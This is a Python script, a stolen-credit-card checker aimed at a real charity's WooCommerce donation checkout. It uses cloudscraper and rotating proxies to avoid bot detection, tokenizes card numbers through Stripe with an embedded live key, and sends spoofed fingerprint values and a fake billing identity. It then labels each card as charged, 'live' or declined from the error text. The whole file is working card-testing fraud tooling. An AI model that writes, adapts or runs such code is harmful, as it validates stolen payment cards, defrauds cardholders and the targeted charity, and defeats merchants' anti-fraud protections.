import json
import random
import re
import string
import time
import asyncio
import cloudscraper

STRIPE_PK = (
    'pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrK'
    'fWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6'
)

_rnd = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))

def _format_proxy(proxy: str | None) -> dict | None:
    if not proxy:
        return None
    p = str(proxy).strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return {"http": p, "https": p}
    parts = p.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}", "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
        elif parts[3].isdigit():
            return {"http": f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}", "https": f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"}
    elif len(parts) == 2:
        return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
    return {"http": f"http://{p}", "https": f"http://{p}"}

def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False})
    proxies = _format_proxy(proxy_url)
    if proxies:
        scraper.proxies = proxies

    try:
        # Step 1: visit donate page
        r1 = scraper.get('https://forcesforchange.org/donate/', timeout=25)
        if r1.status_code >= 400:
            return "error", f"Donate page HTTP {r1.status_code}", "connection_error"

        # Step 2: find product id & add to cart
        pid_match = (
            re.search(r'["\']add-to-cart["\']\s*value=["\'](\d+)["\']', r1.text)
            or re.search(r'\?add-to-cart=(\d+)', r1.text)
            or re.search(r'"product_id"\s*:\s*(\d+)', r1.text)
        )
        pid = pid_match.group(1) if pid_match else "2210"

        scraper.post(
            'https://forcesforchange.org/?wc-ajax=add_to_cart',
            data={'product_id': pid, 'quantity': '1'},
            headers={'X-Requested-With': 'XMLHttpRequest'},
            timeout=25
        )

        # Step 3: fetch checkout page for nonce
        r_chk = scraper.get('https://forcesforchange.org/checkout/', timeout=25)
        nonce_match = (
            re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', r_chk.text)
            or re.search(r'checkout_nonce":"([^"]+)"', r_chk.text)
        )
        nonce = nonce_match.group(1) if nonce_match else ""

        # Step 4: tokenize card via Stripe API
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'billing_details[address][country]': 'US',
            'key': STRIPE_PK,
            '_stripe_version': '2024-06-20',
            'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent',
            'guid': _rnd(48),
            'muid': _rnd(32),
            'sid': _rnd(32),
            'time_on_page': str(random.randint(5000, 15000))
        }
        s_resp = scraper.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, timeout=25).json()

        if 'error' in s_resp:
            err_msg = s_resp['error'].get('message', 'Declined')
            err_lower = err_msg.lower()
            if "security code" in err_lower or "incorrect_cvc" in err_lower:
                return "live", err_msg, "ccn"
            return "declined", err_msg, "declined"

        pm_id = s_resp.get('id')
        if not pm_id:
            return "error", "Failed to tokenize card", "token_error"

        # Step 5: submit checkout
        chk_data = {
            'billing_email': f"{_rnd(8)}@gmail.com",
            'billing_first_name': 'James',
            'billing_last_name': 'Smith',
            'billing_country': 'US',
            'billing_address_1': '123 Main St',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postcode': '10001',
            'payment_method': 'stripe',
            'wc-stripe-is-deferred-intent': '1',
            'woocommerce-process-checkout-nonce': nonce,
            'wc-stripe-payment-method': pm_id
        }

        chk_resp = scraper.post(
            'https://forcesforchange.org/?wc-ajax=checkout',
            data=chk_data,
            headers={'X-Requested-With': 'XMLHttpRequest'},
            timeout=30
        ).json()

        if chk_resp.get('result') == 'success' or chk_resp.get('redirect'):
            return "charged", "Payment Success", "charged"

        messages = chk_resp.get('messages', '')
        if isinstance(messages, str):
            clean_msg = re.sub(r'<[^>]+>', '', messages).strip()
            if clean_msg:
                low_msg = clean_msg.lower()
                if "security code" in low_msg or "incorrect" in low_msg:
                    return "live", clean_msg, "ccn"
                if "insufficient" in low_msg:
                    return "live", clean_msg, "insufficient_funds"
                return "declined", clean_msg, "declined"

        return "declined", "We were unable to process your order", "declined"

    except Exception as e:
        return "error", str(e)[:120], "exception"

async def check_card_stripe_1(cc_str: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    cc, mm, yy, cvc = [p.strip() for p in parts[:4]]
    return await asyncio.to_thread(_process_card_sync, cc, mm, yy, cvc, proxy_url)
